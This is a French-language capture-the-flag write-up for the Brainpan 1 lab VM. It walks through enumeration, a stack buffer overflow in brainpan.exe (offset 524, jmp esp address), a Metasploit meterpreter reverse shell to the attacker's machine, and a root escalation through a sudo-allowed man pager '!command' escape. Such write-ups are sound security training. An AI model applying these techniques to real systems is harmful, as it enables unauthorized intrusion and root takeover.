## Brainpan 1 ##

IP de la VM: 192.168.1.80

1. Enumération

  Retour du nmap:

  ```nmap
  # nmap -A 192.168.1.80

  Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-11-07 16:54 CET
  Nmap scan report for brainpan (192.168.1.80)
  Host is up (0.0039s latency).
  Not shown: 998 closed ports
  PORT      STATE SERVICE VERSION
  9999/tcp  open  abyss?
  10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
  | ndmp-version:
  |_  ERROR: Failed to get host information from server
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  SF-Port9999-TCP:V=6.49BETA5%I=7%D=11/7%Time=563E1EB6%P=x86_64-pc-linux-gnu
  SF:%r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x2
  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
  SF:x20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_
  SF:\|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20
  SF:\x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20
  SF:_\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20
  SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20
  SF:_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x
  SF:20_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\
  SF:x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\
  SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\
  SF:x20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20
  SF:\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\
  SF:x20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x2
  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
  SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x
  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
  SF:\x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAIN
  SF:PAN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20EN
  SF:TER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
  SF:\n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
  MAC Address: 08:00:27:D8:48:44 (Cadmus Computer Systems)
  Device type: general purpose
  Running: Linux 2.6.X|3.X
  OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
  OS details: Linux 2.6.32 - 3.10
  Network Distance: 1 hop

  TRACEROUTE
  HOP RTT     ADDRESS
  1   3.86 ms brainpan (192.168.1.80)

  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 53.90 seconds
  ```
  * port 9999

  <pre>
  #  nc -nv  192.168.1.80 9999
  (UNKNOWN) [192.168.1.80] 9999 (?) open
  _|                            _|                                        
  _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
  _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
  _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
  _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                              _|                          
                                              _|

  [________________________ WELCOME TO BRAINPAN _________________________]
                            ENTER THE PASSWORD                              

                            >>
  </pre>

  Aucun mot de passe standard ne fonctionne

  * Port 10000
  Service HTTP renvoyant vers une page web sans intérêt.

  Test du serveur avec Nikto

  <pre>
  # nikto -host  192.168.1.80:10000
  - Nikto v2.1.6
  ---------------------------------------------------------------------------
  + Target IP:          192.168.1.80
  + Target Hostname:    192.168.1.80
  + Target Port:        10000
  + Start Time:         2015-11-07 23:56:41 (GMT1)
  ---------------------------------------------------------------------------
  + Server: SimpleHTTP/0.6 Python/2.7.3
  + The anti-clickjacking X-Frame-Options header is not present.
  + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
  + Python/2.7.3 appears to be outdated (current is at least 2.7.5)
  + SimpleHTTP/0.6 appears to be outdated (current is at least 1.2)
  + OSVDB-3092: /bin/: This might be interesting...
  + OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
  + ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
  + Scan terminated:  20 error(s) and 7 item(s) reported on remote host
  + End Time:           2015-11-07 23:56:54 (GMT1) (13 seconds)
  ---------------------------------------------------------------------------
  + 1 host(s) tested
  </pre>

  On remarque les lignes suivantes:

  <pre>
  + OSVDB-3092: /bin/: This might be interesting...
  + OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
  </pre>

  Le répertoire 'bin' du serveur HTTP renvoi vers l'index du répertoire qui permet de télécharger le fichier **brainpan.exe**

  Analyse du fichier
  <pre>
  # file brainpan.exe
  brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
  </pre>

  C'est donc bien un fichier exécutable Windows.
  Si on l'exécute:

  <pre>
  # wine brainpan.exe
  [+] initializing winsock...done.
  [+] server socket created.
  [+] bind done on port 9999
  [+] waiting for connections.
  </pre>

  Il semble que celui-ci attend une connexion sur le port 9999, comme dans le cas de la VM. Un netcat sur le port 9999 affiche la même banière qu'une connexon sur ce même port de la VM.

2. Exploitation de l'exécutable

  En testant avec différents paramètres au niveau du client, l'affichage côté serveur donne:

  <pre>
  # wine brainpan.exe
  [+] initializing winsock...done.
  [+] server socket created.
  [+] bind done on port 9999
  [+] waiting for connections.
  [+] received connection.
  [get_reply] s = [12345
  ]
  [get_reply] copied 6 bytes to buffer
  [+] check is -1
  [get_reply] s = [12345
  ]
  [get_reply] copied 6 bytes to buffer
  [+] received connection.
  [get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA■B]
  [get_reply] copied 1003 bytes to buffer
  wine: Unhandled page fault on read access to 0x41414141 at address 0x41414141 (thread 0009), starting debugger...
  </pre>

  bingo, 0x41414141 donnant la chaîne 'AAAA'.
  Le retour précédent indique que l'exécutable à copié 1003 caractères dans le tampon. Essayon de générer un pattern de 2000 caractères:
  <pre>
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2000
  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
  [...]
  </pre>

  En copiant cette chaîne coté client, coté serveur on observe:

  <pre>
  # wine brainpan.exe
  [+] initializing winsock...done.
  [+] server socket created.
  [+] bind done on port 9999
  [+] waiting for connections.
  [+] received connection.
  [get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2■B]
  [get_reply] copied 1003 bytes to buffer
  wine: Unhandled page fault on read access to 0x35724134 at address 0x35724134 (thread 0009), starting debugger...
  </pre>

  Fine. Cherchons l'offset maintenant:

  <pre>
  # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 35724134
  [*] Exact match at offset 524
  </pre>

  On avance...

  Il faut maintenant rechercher un 'jmp esp' dans le code.
  L'instruction à rechercher est '\xE4\xFF'

  <pre>
  # /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
  nasm > jmp esp
  00000000  FFE4              jmp esp
  </pre>

  En utilisant la commande de Mona dans Imunity Debugger
  ** !mona find -s "\xff\xe4" **

  on trouve donc l'adresse 0x0x311712F3

  Il ne reste plus qu'à développer l'exploit qui va bien pour ouvrir un remote shell.
  L'IP de Kali est codé en dur dans le shellcode. Par contre l'IP du serveur est récupéré depuis la ligne de commande, afin que l'exploit fonctionne en test avec le serveur local, mais aussi sur la VM.
  Pour le shellcode, nous prenons un reverse Linux, car la VM semble tourner sous Linux, mais comme l'exécutable est de type Windows, il doit certainement être lancé avec Wine.

  <pre>
  msf > use exploit/multi/handler
  msf exploit(handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
  PAYLOAD => linux/x86/meterpreter/reverse_tcp
  msf exploit(handler) > set LHOST 192.168.1.5
  LHOST => 192.168.1.5
  msf exploit(handler) > set LPORT 4444
  LPORT => 4444
  msf exploit(handler) > run

  [*] Started reverse handler on 192.168.1.5:4444
  [*] Starting the payload handler...
  [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
  [*] Sending stage (1495598 bytes) to 192.168.1.80
  [*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.80:58063) at 2015-11-08 14:59:39 +0100

  meterpreter > sysinfo
  Computer     : brainpan
  OS           : Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 (i686)
  Architecture : i686
  Meterpreter  : x86/linux
  meterpreter > getuid
  Server username: uid=1002, gid=1002, euid=1002, egid=1002, suid=1002, sgid=1002
  </pre>

  La connexion semble un peu instable.

3. Elévation de prigilèges
  Il ne semble rien y avoir dans le répertoire de l'utilisateur.

  Cependant la commande sudo renvoie

  ````
  $ sudo -l
  Matching Defaults entries for puck on this host:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User puck may run the following commands on this host:
      (root) NOPASSWD: /home/anansi/bin/anansi_util

  ````

Bien. Si on lance l'exécutable (aucun mot de passe demandé comme l'indique la config)

```
$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
L'option network exécute la commande **ifconfig**
L'option proclist renvoie une erreur de terminal.
L'option manual (avec la commande "ls" par exemple) renvoi vers le man de la commande.

En recherchat on constante que dans le manuel, si on tape '!commande', la commande est exécutée avec le shell de l'utilisateur. Donc en sudo, avec le root?
En tapant "sudo /home/anansi/bin/anansi_util man"
On rentre dans le man du man....
C'est parti:

```
Manual page man(1) line 2 (press h for help or q to quit)!id
!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
```

Il n'y a pas de flag sur la VM
